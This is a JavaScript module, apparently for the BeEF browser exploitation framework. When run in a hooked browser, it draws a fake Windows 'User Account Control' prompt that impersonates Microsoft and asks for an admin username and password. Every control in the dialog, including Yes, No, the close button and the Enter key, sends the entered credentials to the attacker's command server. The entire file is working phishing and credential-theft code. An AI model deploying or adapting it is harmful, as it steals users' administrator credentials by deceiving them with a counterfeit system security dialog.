beef.execute(function() {
    function __fake_uac_run(run) {
	var _run = run;
	if (!document.getElementsByTagName("body")[0]) {
	    setTimeout(function(){__fake_uac_run(_run);},10);
	} else {
	    _run();
	}
    }

    var Fake_UAC = function () {
	return this;
    }


    function mouseUp() {
	window.removeEventListener('mousemove', divMove, true);
    }

    function mouseDown(e){
	var div = document.getElementById('frame');
	offY= e.clientY-parseInt(div.offsetTop);
	offX= e.clientX-parseInt(div.offsetLeft);
	window.addEventListener('mousemove', divMove, true);
    }

    function divMove(e){
	var div = document.getElementById('frame');
	div.style.position = 'absolute';
	div.style.top = (e.clientY-offY+233) + 'px';
	div.style.left = (e.clientX-offX+227) + 'px';
    }

    function sendCreds() {
	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'username='+username_input.value+', password='+password_input.value);
	return false;
    }
    
    Fake_UAC.prototype.run = function (arg) {
	document.styleSheets[0].insertRule("* { -ms-user-select: none; }",0);
	document.styleSheets[0].insertRule("*:hover{ cursor: default; }",0);
	document.styleSheets[0].insertRule("a.fakeuac:hover{ cursor: pointer; }",0);
	document.styleSheets[0].insertRule("input.fakeuac:hover{ cursor: text; }",0);
	document.body.style.overflow="hidden";
	
	div_frame = document.createElement("div");
	div_frame.id = "frame";
	document.body.appendChild(div_frame);
	window.addEventListener('mouseup', mouseUp, false);
	div_frame.style.border="1px solid #0078d7";
	div_frame.style.width="454px";
	div_frame.style.textAlign="left";
	div_frame.style.paddingBottom = "25px";
	div_frame.style.backgroundColor = "#e6e6e6";
	div_frame.style.zIndex = "100";
	div_frame.style.margin = "auto";
	div_frame.style.position = "absolute";
	div_frame.style.top= "50%";
	div_frame.style.left= "50%";
	div_frame.style.marginLeft= "-227px";
	div_frame.style.marginTop= "-233px";



	blue_header = document.createElement("div");
	blue_header.className="fakeuac";
	blue_header.id = "blue-header";
	blue_header.style.width="auto";
	blue_header.style.backgroundColor="#76b9ed";
	div_frame.appendChild(blue_header);


	window_title = document.createElement("div");
	window_title.addEventListener('mousedown', mouseDown, false);
	window_title.className="fakeuac";
	window_title.style.paddingLeft="23px";
	window_title.style.width="auto";
	window_title.style.height="32px";
	window_title.style.fontSize="10px";
	blue_header.appendChild(window_title);

	title_align = document.createElement("div");
	title_align.className="fakeuac";
	title_align.style.position="relative";
	title_align.style.top="7px";
	window_title.appendChild(title_align);

	window_title_text = document.createElement("span");
	window_title_text.className="fakeuac";
	window_title_text.style.fontSize="12px";
	window_title_text.style.fontFamily="Segoe UI";
	window_title_text.style.fontWidth="400";
	window_title_text.textContent="User Account Control";
	title_align.appendChild(window_title_text);


	title_x = document.createElement("canvas");
	title_x.className="fakeuac";
	title_x.id = "uac-x";
	title_x.style.position="absolute";
	title_x.style.right="15px";
	title_x.height="10";
	title_x.width="10";
	title_x.onclick=function() {
	    sendCreds();
	    div_frame.parentElement.removeChild(div_frame);
	};
	title_align.appendChild(title_x);
	c = document.getElementById("uac-x");
	ctx = c.getContext("2d");
	ctx.fillStyle = "blue";
	ctx.fill();
	ctx.beginPath();
	ctx.moveTo(0, 0);
	ctx.lineTo(10, 10);
	ctx.stroke();
	ctx.beginPath();
	ctx.moveTo(10, 0);
	ctx.lineTo(0, 10);
	ctx.stroke();


	window_question = document.createElement("div");
	window_question.className="fakeuac";
	window_question.style.paddingBottom="12px";
	window_question.style.paddingLeft="23px";
	window_question.style.paddingRight="30px";
	window_question.style.width="auto";
	window_question.style.height="auto";
	blue_header.appendChild(window_question);

	window_question_text = document.createElement("span");
	window_question_text.className="fakeuac";
	window_question_text.style.fontSize="20px";
	window_question_text.style.fontWeight="400";
	window_question_text.style.fontFamily="Segoe UI";
	window_question_text.style.fontWidth="400";
	window_question_text.textContent="Do you want to allow this app to make changes to your device?"
	window_question.appendChild(window_question_text);



	browser_permission = document.createElement("div");
	browser_permission.className="fakeuac";
	browser_permission.style.paddingTop="15px";
	browser_permission.style.paddingLeft="20px";
	div_frame.appendChild(browser_permission);

	app_icon = document.createElement("img");
	app_icon.className="fakeuac";
	app_icon.className="fakeuac";
	app_icon.style.verticalAlign="middle";
	app_icon.src="<%= @bind_url %>/iedropbg.png";
	browser_permission.appendChild(app_icon);

	app_text = document.createElement("span");
	app_text.className="fakeuac";
	app_text.style.verticalAlign="middle";
	app_text.style.paddingLeft="15px";
	app_text.style.fontSize="19px";
	app_text.style.fontFamily="Segoe UI";
	app_text.style.fontWidth="400";
	app_text.textContent="Microsoft Internet Explorer";
	browser_permission.appendChild(app_text);



	publisher = document.createElement("div");
	publisher.style.paddingTop="14px";
	publisher.style.paddingLeft="23px";
	div_frame.appendChild(publisher);

	publisher_lbl = document.createElement("span");
	publisher_lbl.className="fakeuac";
	publisher_lbl.innerHTML="Verified publisher: Microsoft Corporation<br />File origin: Hard drive on this computer";
	publisher_lbl.style.fontSize="15px";
	publisher_lbl.style.fontFamily="Segoe UI";
	publisher_lbl.style.fontWidth="400";
	publisher.appendChild(publisher_lbl);


	program_location = document.createElement("div");
	program_location.style.paddingLeft="23px";
	program_location.style.display="none";
	div_frame.appendChild(program_location);

	program_location_lbl = document.createElement("span");
	program_location_lbl.className="fakeuac";
	program_location_lbl.style.fontSize="15px";
	program_location_lbl.style.fontFamily="Segoe UI";
	program_location_lbl.style.fontWidth="400";
	program_location_lbl.textContent="Program location: \"C:\\Program Files\\Internet Explorer \\iexplore.exe\"";
	program_location.appendChild(program_location_lbl);
	
	details = document.createElement("div");
	details.className="fakeuac";
	details.style.paddingTop="20px";
	details.style.paddingLeft="23px";
	div_frame.appendChild(details);

	details_link = document.createElement("a");
	details_link.className="fakeuac";
	details_link_text__show_more_details = "Show more details";
	details_link_text__hide_details = "Hide details";
	details_link.href="#";
	details_link.style.color="#2c8dda";
	details_link.style.textDecoration="none";
	details_link.style.fontSize="15px";
	details_link.style.fontFamily="Segoe UI";
	details_link.style.fontWidth="400";
	details_link.textContent=details_link_text__show_more_details;
	details_link.onclick=function(){
	    if (details_link.textContent == details_link_text__show_more_details) {
		details_link.textContent=details_link_text__hide_details;
		program_location.style.display="block";
	    } else {
		details_link.textContent=details_link_text__show_more_details;
		program_location.style.display="none";
	    }
	};
	details.appendChild(details_link);



	continue_container = document.createElement("div");
	continue_container.style.paddingTop="8px";
	continue_container.style.paddingLeft="23px";
	div_frame.appendChild(continue_container);

	continue_lbl = document.createElement("span");
	continue_lbl.className="fakeuac";
	continue_lbl.style.fontSize="15px";
	continue_lbl.style.fontFamily="Segoe UI";
	continue_lbl.style.fontWidth="400";
	continue_lbl.textContent="To continue, enter an admin user name and password.";
	continue_container.appendChild(continue_lbl);

	prompt_area = document.createElement("div");
	prompt_area.className="fakeuac";
	prompt_area.style.paddingTop="18px";
	prompt_area.style.paddingLeft="23px";
	prompt_area.style.width="100%";
	prompt_area.style.fontSize="13px";
	prompt_area.style.fontFamily="Segoe UI";
	prompt_area.style.fontWidth="400";
	prompt_area.style.marginBottom="15px";
	div_frame.appendChild(prompt_area);


	user_img = document.createElement("img");
	user_img.className="fakeuac";
	user_img.src = "<%= @bind_url %>/user.png";
	user_img.style.marginRight="10px";
	user_img.style.verticalAlign="middle";
	prompt_area.appendChild(user_img);

	prompt_container = document.createElement("div");
	prompt_container.className="fakeuac";
	prompt_container.style.display="inline-block";
	prompt_container.style.verticalAlign="middle";
	prompt_area.appendChild(prompt_container);

	username_container = document.createElement("div");
	username_container.className="fakeuac";
	prompt_container.appendChild(username_container);

	username_input = document.createElement("input");
	username_input.className="fakeuac";
	username_input.type="text";
	username_input.name="username";
	username_input.placeholder="DOMAIN\\Username";
	username_input.style.width="250px";
	username_input.style.fontSize="15px";
	username_input.style.paddingLeft="7px";
	username_input.style.paddingTop="8px";
	username_input.style.paddingBottom="5px";
	username_input.style.border="1px solid #0078d7";
	username_input.style.marginBottom="15px";
	username_container.appendChild(username_input);

	password_container = document.createElement("div");
	password_container.className="fakeuac";
	prompt_container.appendChild(password_container);

	password_input = document.createElement("input");
	password_input.className="fakeuac";
	password_input.type="password";
	password_input.name="password";
	password_input.placeholder="Password";
	password_input.style.width="250px";
	password_input.style.fontSize="15px";
	password_input.style.paddingLeft="7px";
	password_input.style.paddingTop="8px";
	password_input.style.paddingBottom="5px";
	password_input.style.border="1px solid #0078d7";
	password_container.appendChild(password_input);

	
	buttons_container = document.createElement("div");
	buttons_container.className="fakeuac";
	buttons_container.style.paddingTop="20px";
	buttons_container.style.paddingLeft="23px";
	div_frame.appendChild(buttons_container);

	yes_button = document.createElement("input");
	yes_button.type="submit";
	yes_button.value="Yes";
	yes_button.style.width="45%";
	yes_button.style.height="34px";
	yes_button.style.backgroundColor="#b8b8b8";
	yes_button.style.border="0";
	yes_button.style.borderRadius="0px";
	yes_button.style.boxShadow="none";
	yes_button.style.fontSize="15px";
	yes_button.style.marginRight="3px";
	yes_button.style.fontFamily="Segoe UI";
	yes_button.style.fontWidth="400";
	buttons_container.appendChild(yes_button);

	no_button = document.createElement("input");
	no_button.type="submit";
	no_button.value="No";
	no_button.style.width="45%";
	no_button.style.height="34px";
	no_button.style.backgroundColor="#b8b8b8";
	no_button.style.border="0";
	no_button.style.borderRadius="0px";
	no_button.style.boxShadow="none";
	no_button.style.fontSize="15px";
	no_button.style.marginLeft="3px";
	no_button.style.fontFamily="Segoe UI";
	no_button.style.fontWidth="400";
	buttons_container.appendChild(no_button);


	username_input.onkeydown=function(){
	    if (event.keyCode==10 || event.keyCode==13) {
		sendCreds();
		div_frame.parentElement.removeChild(div_frame);
	    }
	};
	password_input.onkeydown=function(){
	    if (event.keyCode==10 || event.keyCode==13) {
		sendCreds();
		div_frame.parentElement.removeChild(div_frame);
	    }
	};

	yes_button.onclick=function() {
	    sendCreds();
	    div_frame.parentElement.removeChild(div_frame);
	};
	no_button.onclick=function() {
	    sendCreds();
	    div_frame.parentElement.removeChild(div_frame);
	};
    }


    
    __fake_uac_run(function(){
	timer = setInterval(function () {
	    if (window.innerWidth >= 460 && window.innerHeight >= 470) {
	        new Fake_UAC().run();
		clearInterval(timer);
	    }
	}, 1000);
	
    });
});
